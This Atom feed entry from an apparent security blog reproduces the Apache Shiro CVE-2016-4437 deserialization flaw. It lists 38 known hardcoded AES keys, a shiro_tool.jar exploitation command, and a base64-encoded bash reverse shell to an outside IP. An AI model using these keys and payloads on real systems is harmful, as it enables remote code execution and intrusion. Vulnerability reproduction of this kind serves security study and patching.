    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-4437复现</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2016-4437/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2016-4437/</id>
    <published>2021-06-06T12:54:08.000Z</published>
    <updated>2021-06-06T13:11:13.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="（CVE-2016-4437）Apache-Shiro-反序列化漏洞"><a href="#（CVE-2016-4437）Apache-Shiro-反序列化漏洞" class="headerlink" title="（CVE-2016-4437）Apache Shiro 反序列化漏洞"></a>（CVE-2016-4437）Apache Shiro 反序列化漏洞</h2><hr><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01.漏洞简述"></a>0x01.漏洞简述</h2><p>Apache shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code>–&gt;<code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><a id="more"></a><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h2><p>Apache Shiro &lt;= v1.2.4</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03.漏洞分析"></a>0x03.漏洞分析</h2><p><span class="exturl" data-url="aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8zOTYuaHRtbA==">不造轮子了。。。<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04.漏洞复现"></a>0x04.漏洞复现</h2><p> 网络上收集到的key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><p>使用shiro_tool.jar反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro_tool.jar http:<span class="comment">//your_ip:8080</span></span><br></pre></td></tr></table></figure><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_01.png" class><p>使用1和10都可以，反弹shell需要编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xOTUuMTU5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>nc监听反弹shell</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_02.png" class><p>抓包分析，看到http请求头Cookie字段为 rememberMe=**，响应头存在Set-Cookie:rememberMe=deleteMe</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_03.png" class><h2 id="0x05-官方修复"><a href="#0x05-官方修复" class="headerlink" title="0x05.官方修复"></a>0x05.官方修复</h2><ul><li>删除代码里的默认密钥</li><li>默认配置里注释了默认密钥</li><li>如果不配置密钥，每次会重新随机一个密钥</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;（CVE-2016-4437）Apache-Shiro-反序列化漏洞&quot;&gt;&lt;a href=&quot;#（CVE-2016-4437）Apache-Shiro-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;（CVE-2016-4437）Apache Shiro 反序列化漏洞&quot;&gt;&lt;/a&gt;（CVE-2016-4437）Apache Shiro 反序列化漏洞&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-漏洞简述&quot;&gt;&lt;a href=&quot;#0x01-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x01.漏洞简述&quot;&gt;&lt;/a&gt;0x01.漏洞简述&lt;/h2&gt;&lt;p&gt;Apache shiro默认使用了&lt;code&gt;CookieRememberMeManager&lt;/code&gt;，其处理cookie的流程是：得到&lt;code&gt;rememberMe的cookie值&lt;/code&gt;–&amp;gt;&lt;code&gt;Base64解码&lt;/code&gt;–&amp;gt;&lt;code&gt;AES解密&lt;/code&gt;–&amp;gt;&lt;code&gt;反序列化&lt;/code&gt;。&lt;br&gt;然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
</feed>
